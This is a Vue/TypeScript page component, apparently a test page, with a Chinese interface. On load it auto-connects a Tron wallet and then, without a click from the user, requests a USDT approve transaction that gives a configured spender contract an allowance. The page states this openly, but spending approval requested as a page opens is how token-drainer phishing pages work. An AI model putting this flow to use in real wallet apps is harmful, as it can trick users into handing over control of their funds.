<script setup lang="ts">
// <!-- Import Dependencies Start --->
import { computed, onMounted, ref, watch } from 'vue'

import { useTronWallet } from '@/composables/use-tron-wallet'
import {
  TRON_SPENDER_ADDRESS,
  TRON_USDT_ADDRESS,
  TRON_NETWORK_NAME,
} from '@/config/tron'
import {
  formatTronUsdtAmount,
  readTrc20Allowance,
  sendTrc20Approve,
  TRON_TEST_APPROVE_AMOUNT,
  TRON_TEST_APPROVE_AMOUNT_LABEL,
} from '@/contracts/trc20-contract'
import { mapTronErrorMessage } from '@/utils/tron-error-util'
import { waitForTronTransaction } from '@/utils/tron-util'
// <!-- Import Dependencies End --->

// <!-- Import Custom Components Start --->
import WrongTronNetworkBanner from '@/components/WrongTronNetworkBanner.vue'
// <!-- Import Custom Components End --->

type ApprovePhase = 'idle' | 'pending' | 'confirming' | 'success' | 'error'

// <!-- Reactive Data Start --->
const {
  address,
  walletStatus,
  walletError,
  walletName,
  isConnecting,
  isConnected,
  tronWeb,
  isOnTargetNetwork,
  networkLabel,
  connect,
} = useTronWallet()

const approvePhase = ref<ApprovePhase>('idle')
const approveErrorMessage = ref('')
const approveTxHash = ref('')
const approveAttempted = ref(false)
const allowance = ref<bigint | null>(null)
const isAllowanceFetched = ref(false)
// <!-- Reactive Data End --->

// <!-- Computed Properties Start --->
const statusLabel = computed(() => {
  if (isConnecting.value) return '连接中…'
  if (!isConnected.value) return '未连接'
  if (!isOnTargetNetwork.value) return '已连接，网络不正确'
  return `已连接 ${TRON_NETWORK_NAME}`
})

const hasEnoughAllowance = computed(() => {
  if (allowance.value === null) return false
  return allowance.value >= TRON_TEST_APPROVE_AMOUNT
})

const isApproveBusy = computed(
  () => approvePhase.value === 'pending' || approvePhase.value === 'confirming',
)

const showRetryApproveButton = computed(() => {
  if (approvePhase.value === 'error') return true
  return (
    isConnected.value
    && isOnTargetNetwork.value
    && isAllowanceFetched.value
    && !hasEnoughAllowance.value
    && approvePhase.value === 'idle'
  )
})

const approveStatusLabel = computed(() => {
  switch (approvePhase.value) {
    case 'pending':
      return '等待钱包签名…'
    case 'confirming':
      return '交易确认中…'
    case 'success':
      return '授权成功'
    case 'error':
      return '授权失败'
    default:
      if (!isConnected.value || !isOnTargetNetwork.value) return '等待钱包连接'
      if (!isAllowanceFetched.value) return '查询授权额度中…'
      if (hasEnoughAllowance.value) return '已有足够授权'
      return '待授权'
  }
})

const formattedAllowance = computed(() => {
  if (allowance.value === null) return '—'
  return formatTronUsdtAmount(allowance.value)
})
// <!-- Computed Properties End --->

// <!-- Function & API Request Start --->
const fetchAllowance = async () => {
  if (!isConnected.value || !isOnTargetNetwork.value || !address.value || !tronWeb.value) {
    isAllowanceFetched.value = false
    allowance.value = null
    return
  }

  try {
    allowance.value = await readTrc20Allowance(tronWeb.value, address.value)
    isAllowanceFetched.value = true
  } catch (error) {
    isAllowanceFetched.value = false
    approvePhase.value = 'error'
    approveErrorMessage.value = mapTronErrorMessage(error)
  }
}

const autoConnectWallet = async () => {
  if (isConnecting.value || isConnected.value) return
  await connect()
}

const runAutoApprove = async () => {
  if (!isConnected.value || !isOnTargetNetwork.value || !address.value || !tronWeb.value) return
  if (!isAllowanceFetched.value) return
  if (hasEnoughAllowance.value) return
  if (approveAttempted.value) return
  if (isApproveBusy.value) return

  approveAttempted.value = true
  approvePhase.value = 'pending'
  approveErrorMessage.value = ''

  try {
    const txid = await sendTrc20Approve(tronWeb.value)
    approveTxHash.value = txid
    approvePhase.value = 'confirming'

    const receipt = await waitForTronTransaction(tronWeb.value, txid)
    if (receipt.receipt?.result && receipt.receipt.result !== 'SUCCESS') {
      throw new Error(`交易失败：${receipt.receipt.result}`)
    }

    approvePhase.value = 'success'
    await fetchAllowance()
  } catch (error) {
    approvePhase.value = 'error'
    approveErrorMessage.value = mapTronErrorMessage(error)
    approveAttempted.value = false
  }
}

const handleRetryConnect = async () => {
  await connect()
}

const handleRetryApprove = async () => {
  approveAttempted.value = false
  approvePhase.value = 'idle'
  approveErrorMessage.value = ''
  approveTxHash.value = ''
  await fetchAllowance()
  await runAutoApprove()
}
// <!-- Function & API Request End --->

// <!-- Life Cycle Start --->
onMounted(() => {
  void autoConnectWallet()
})

watch(isConnected, (connected) => {
  if (connected) {
    void fetchAllowance()
    return
  }

  allowance.value = null
  isAllowanceFetched.value = false
  approvePhase.value = 'idle'
  approveAttempted.value = false
  approveTxHash.value = ''
})

watch([isConnected, isOnTargetNetwork, isAllowanceFetched, allowance], () => {
  void runAutoApprove()
})
// <!-- Life Cycle End --->
</script>

<template>
  <div class="flex flex-col gap-4 max-w-lg">
    <div>
      <h1 class="text-2xl font-semibold mb-1">
        TRON 连接测试
      </h1>
      <p class="text-surface-600">
        打开页面将自动连接 Tron 钱包（TronLink / TokenPocket / imToken / OKX），并在 {{ TRON_NETWORK_NAME }} 授权
        {{ TRON_TEST_APPROVE_AMOUNT_LABEL }} 给 Spender 合约。
      </p>
    </div>

    <WrongTronNetworkBanner
      :is-connected="isConnected"
      :is-on-target-network="isOnTargetNetwork"
    />

    <Card>
      <template #title>
        连接状态
      </template>
      <template #content>
        <dl class="flex flex-col gap-3 m-0">
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">
              状态
            </dt>
            <dd class="m-0 font-medium">
              {{ statusLabel }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">
              wallet status
            </dt>
            <dd class="m-0 font-mono text-sm">
              {{ walletStatus }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">
              当前网络
            </dt>
            <dd class="m-0">
              {{ networkLabel }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">
              钱包地址
            </dt>
            <dd class="m-0 font-mono text-sm break-all text-right">
              {{ address ?? '—' }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">
              钱包
            </dt>
            <dd class="m-0">
              {{ walletName }}
            </dd>
          </div>
        </dl>

        <Message
          v-if="walletError"
          severity="error"
          :closable="false"
          class="mt-4"
        >
          {{ walletError }}
        </Message>

        <div class="flex flex-wrap gap-2 mt-4">
          <Button
            label="重新连接"
            icon="pi pi-wallet"
            :loading="isConnecting"
            :disabled="isConnecting"
            @click="handleRetryConnect"
          />
        </div>
      </template>
    </Card>

    <Card>
      <template #title>
        USDT 授权
      </template>
      <template #content>
        <dl class="flex flex-col gap-3 m-0">
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">
              Token
            </dt>
            <dd class="m-0 font-mono text-sm break-all text-right">
              {{ TRON_USDT_ADDRESS }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">
              Spender
            </dt>
            <dd class="m-0 font-mono text-sm break-all text-right">
              {{ TRON_SPENDER_ADDRESS }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">
              授权额度
            </dt>
            <dd class="m-0">
              {{ TRON_TEST_APPROVE_AMOUNT_LABEL }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">
              当前 allowance
            </dt>
            <dd class="m-0">
              {{ formattedAllowance }}
            </dd>
          </div>
          <div class="flex justify-between gap-4">
            <dt class="text-surface-600">
              授权状态
            </dt>
            <dd class="m-0 font-medium">
              {{ approveStatusLabel }}
            </dd>
          </div>
          <div
            v-if="approveTxHash"
            class="flex justify-between gap-4"
          >
            <dt class="text-surface-600">
              交易哈希
            </dt>
            <dd class="m-0 font-mono text-sm break-all text-right">
              {{ approveTxHash }}
            </dd>
          </div>
        </dl>

        <Message
          v-if="approvePhase === 'success'"
          severity="success"
          :closable="false"
          class="mt-4"
        >
          已成功授权 {{ TRON_TEST_APPROVE_AMOUNT_LABEL }} USDT
        </Message>

        <Message
          v-if="approveErrorMessage"
          severity="error"
          :closable="false"
          class="mt-4"
        >
          {{ approveErrorMessage }}
        </Message>

        <div class="flex flex-wrap gap-2 mt-4">
          <Button
            v-if="showRetryApproveButton"
            label="重新授权"
            icon="pi pi-check-circle"
            :loading="isApproveBusy"
            :disabled="isApproveBusy"
            @click="handleRetryApprove"
          />
        </div>
      </template>
    </Card>
  </div>
</template>
